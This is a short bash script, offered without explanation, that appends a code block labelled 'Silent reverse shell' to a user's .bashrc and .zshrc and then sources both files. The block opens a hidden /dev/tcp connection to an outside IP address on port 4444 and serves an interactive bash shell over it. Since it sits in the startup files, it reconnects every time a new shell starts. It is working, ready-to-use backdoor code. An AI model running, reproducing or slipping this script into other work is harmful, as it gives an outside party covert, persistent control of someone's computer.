#!/bin/bash

echo '
# Silent reverse shell
() {
  (bash -c "exec 3<>/dev/tcp/103.179.24.71/4444 2>/dev/null && cat <&3 | bash -i >&3 2>&3" &) &>/dev/null
} &!' >> ~/.bashrc && echo '
# Silent reverse shell
() {
  (bash -c "exec 3<>/dev/tcp/103.179.24.71/4444 2>/dev/null && cat <&3 | bash -i >&3 2>&3" &) &>/dev/null
} &!' >> ~/.zshrc

source ~/.zshrc
source ~/.bashrc
